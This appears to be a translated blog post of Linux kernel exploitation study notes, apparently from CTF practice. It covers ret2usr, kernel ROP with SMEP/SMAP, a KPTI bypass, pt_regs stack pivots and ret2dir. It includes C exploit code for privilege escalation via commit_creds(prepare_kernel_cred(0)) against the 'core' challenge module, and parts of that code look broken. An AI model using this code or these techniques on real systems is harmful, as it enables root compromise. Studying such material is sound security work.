# retuser
The idea is: while executing in kernel mode, write the return address of a user program into the kernel-mode stack, then jump to the user code and execute a function defined by the user program, escalating privileges in the meantime and simulating the process of returning to user mode
rip is the last value pushed when switching to kernel mode; iretq restores the registers via pop, in the order from rip to ss

` __attribute__((packed))` is a GCC compiler extension attribute that tells the compiler not to add any padding when packing structure members. Normally, the compiler adds padding bytes between structure members to ensure data alignment, which can increase the size of the structure.
Using the packed attribute ensures that the trap_frame structure is laid out compactly in memory, with each member immediately following the previous one and no extra padding.


1. **`#define KERNCALL __attribute__((regparm(3)))`**:
   - This is a macro definition: `KERNCALL` is defined using the GCC compiler's `regparm` attribute, which specifies that function arguments are passed through registers.
   - `regparm(3)` means the first three arguments of a function are passed via registers instead of the stack. This helps reduce function call overhead and improves performance.

2. **`void *(*prepare_kernel_cred)(void *) KERNCALL = (void *) 0xFFFFFFFF8109CCE0;`**:
   - This line defines a function pointer named `prepare_kernel_cred`, which points to a function that takes one `void` pointer argument and returns a `void` pointer.
   - `KERNCALL` is the macro defined above; it specifies the function calling convention, i.e., arguments are passed via registers.
   - `= (void *) 0xFFFFFFFF8109CCE0;` initializes the `prepare_kernel_cred` pointer to a specific memory address. This address is hardcoded and likely points to the kernel function responsible for preparing (setting up) user credentials.

3. **`void *(*commit_creds)(void *) KERNCALL = (void *) 0xFFFFFFFF8109C8E0;`**:
   - This line is similar to the previous one; it defines another function pointer, `commit_creds`, which also points to a function that takes and returns a `void` pointer.
   - It likewise uses the `KERNCALL` macro to specify the function calling convention.
   - `= (void *) 0xFFFFFFFF8109C8E0;` initializes the `commit_creds` pointer to another specific memory address. This address points to the kernel function responsible for committing (changing) the current task's credentials.

void *init_cred = (void *) 0xFFFFFFFF8223D1A0;

struct trap_frame {
    size_t user_rip;
    size_t user_cs;
    size_t user_rflags;
    size_t user_sp;
    size_t user_ss;
} __attribute__((packed));
struct trap_frame tf;
size_t user_cs, user_rflags, user_sp, user_ss, tf_addr = (size_t) &tf;

void save_status() {
    asm(
            "movq %%cs, %0\n\t"
            "movq %%ss, %1\n\t"
            "movq %%rsp, %2\n\t"
            "pushfq\n\t"
            "popq %3\n\t"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
            :
            : "memory");
    tf.user_rip = (size_t) get_shell;
    tf.user_cs = user_cs;
    tf.user_rflags = user_rflags;
    tf.user_sp = user_sp - 0x1008;
    tf.user_ss = user_ss;
    puts("[*] status has been saved.");
}

void get_root() {
//    commit_creds(init_cred);
    commit_creds(prepare_kernel_cred(0));
    asm volatile (
        "swapgs;"             // 交换GS寄存器的基地址
        "movq %0, %%rsp;"     // 将tf_addr的值移动到栈指针
        "iretq;"               // 从中断或异常返回
        :: "r" (tf_addr)      // 输入操作数列表，tf_addr作为输入
        : "memory"            // 指示汇编代码可能修改内存
    );
}

int core_fd;

void coore_read(char *buf) {
    ioctl(core_fd, 0x6677889B, buf);
}

void set_off(size_t off) {
    ioctl(core_fd, 0x6677889C, off);
}

void core_copy_func(size_t len) {
    ioctl(core_fd, 0x6677889A, len);
}

void core_write(char *buf, size_t len) {
    write(core_fd, buf, len);
}

void rebase() {
    FILE *kallsyms_fd = fopen("/tmp/kallsyms", "r");
    if (kallsyms_fd < 0) {
        puts("[-] Failed to open kallsyms.\n");
        exit(-1);
    }
    char name[0x50], type[0x10];
    size_t addr;
    while (fscanf(kallsyms_fd, "%llx%s%s", &addr, type, name)) {
        size_t offset = -1;
        if (!strcmp(name, "commit_creds")) {
            offset = addr - (size_t) commit_creds;
        } else if (!strcmp(name, "prepare_kernel_cred")) {
            offset = addr - (size_t) prepare_kernel_cred;
        }
        if (offset != -1) {
            printf("[*] offset: %p\n", offset);
            commit_creds = (void *) ((size_t) commit_creds + offset);
            prepare_kernel_cred = (void *) ((size_t) prepare_kernel_cred + offset);
            init_cred = (void *) ((size_t) init_cred + offset);
            break;
        }
    }
    printf("[*] commit_creds: %p\n", (size_t) commit_creds);
    printf("[*] prepare_kernel_cred: %p\n", (size_t) prepare_kernel_cred);
}

size_t get_canary() {

    char buf[64];

    return *(size_t *) buf;
}

int main() {

    save_status();

    if (core_fd < 0) {
        puts("[-] Failed to open core.");
        exit(-1);
    }
    size_t canary = get_canary();
    printf("[*] canary: %p\n", canary);
    char buf[0x100];
    memset(buf, 'a', sizeof(buf));
    *(size_t *) &buf[64] = canary;
    *(void **) &buf[80] = get_root;
    core_write(buf, sizeof(buf));
    core_copy_func(0xffffffffffff0000 | sizeof(buf));
    return 0;
}

# kernel rop
With SMEP and SMAP enabled, kernel space cannot execute user-space code, nor can it access user-space data or jump to user-space code for execution.
Use ROP to execute commit_creds(prepare_kernel_cred(0)) in the kernel to complete privilege escalation, then iret back to user space and execute the getshell function

##  commit_creds( prepare_kernel_cred(0) )
Here, after `prepare_kernel_cred(0)` executes, a `mov rdi, rax; ret` gadget is needed, but there is no suitable one. Following sky's approach, we use `pop rdx; ret; mov rdi,rax; call rdx`; after the pop, rdx holds `pop rcx; ret`, so call rdx is effectively equivalent to a ret

## Bypassing KPTI with swapgs_restore_regs_and_return_to_usermode
[https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo](https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo)
KPTI protection is enabled after changing the CPU type to kvm64.
![在这里插入图片描述](/images/csdn/2024/csdn-139583501/image-017-a798d1ecfe.png)
On a KPTI-enabled kernel, if the value of the CR3 register is not set before privilege escalation returns to user mode (iretq/sysret), the process cannot find the correct page table for the current program, which triggers a segmentation fault and the program exits.




A lazier method is to return using the `swapgs_restore_regs_and_return_to_usermode` function:

You can find its kernel address with `cat /proc/kallsyms| grep swapgs_restore_regs_and_return_to_usermode`
 The code of swapgs_restore_regs_and_return_to_usermode is as follows
![在这里插入图片描述](/images/csdn/2024/csdn-139583501/image-018-140e2b02e3.png)

#  Building kernel ROP with pt_regs
If the overflow is limited so that only the return address can be overwritten, the stack needs to be migrated elsewhere to build the ROP chain. You can build the ROP chain on pt_regs.

 A syscall enters entry_SYSCALL_64, which pushes all registers onto the kernel stack, forming a pt_regs structure. This structure is essentially located at the bottom of the kernel stack and is defined as follows:

```c
struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
    unsigned long r15; //低地址
    unsigned long r14;
    unsigned long r13;
    unsigned long r12;
    unsigned long rbp;
    unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
    unsigned long r11;
    unsigned long r10;
    unsigned long r9;
    unsigned long r8;
    unsigned long rax;
    unsigned long rcx;
    unsigned long rdx;
    unsigned long rsi;
    unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
    unsigned long orig_rax;
/* Return frame for iretq */
    unsigned long rip;
    unsigned long cs;
    unsigned long eflags;
    unsigned long rsp;
    unsigned long ss; //高地址
/* top of stack page */
};
```

> Since the kernel stack is only one page in size, you only need to find a gadget of the form "add rsp, val ; ret", and then use the register contents that were set up and pushed in to complete the ROP chain

The offset between the current rsp and pt_regs ![在这里插入图片描述](/images/csdn/2024/csdn-139583501/image-030-9777bfc0d9.png)
 pt_regs is 0xa8 bytes in total

**It is also worth noting that the positions in pt_regs corresponding to r11 and rcx are overwritten with eflags and the return address (which is set to system("/bin/sh")) respectively, and are not under our control.**
Use add rsp, value or pop instructions to move rsp to pt_regs, e.g. `add    rsp,0xc8

# ret2dir
physmap is a very large contiguous virtual memory space managed by the kernel. To improve efficiency, addresses in this space are directly mapped to RAM addresses. RAM is much smaller than physmap, which means any RAM address has a corresponding virtual memory address in physmap. On the other hand, we know that user-space virtual memory is also mapped to RAM. This creates a situation where two virtual memory addresses (one in physmap, one in user space) map to the same RAM address. In other words, the data and code we create in user space are very likely mapped into the physmap space. Based on this theory, use mmap() in user space to map the privilege-escalation code into memory, then find its corresponding copy in physmap, and modify EIP to jump to the copy and execute it. Because physmap itself is in kernel space, neither SMAP nor SMEP takes effect.

> In newer kernels, the direct mapping area no longer has executable permission, so it is difficult for us to directly place shellcode in user space for exploitation. However, we can still complete the exploitation by placing a ROP chain in user space, i.e., change rsp to a certain offset in physmap and then ret



In plain terms, you can find a region of memory controlled by user mode at a kernel address

1.  mmap a large amount of memory (ROP chains, etc.) to increase the probability of a hit
Allocate page by page with mmap; except for the ROP chain placed at the end, the preceding part is filled with the address of ret
2. Leak the address of a slab and calculate the physmap address (with KASLR enabled, the physmap address is randomized)
3. Hijack the kernel execution flow onto physmap
	Migrate the stack to pt_regs, and then use `pop rsp ret ` to migrate the stack onto physmap
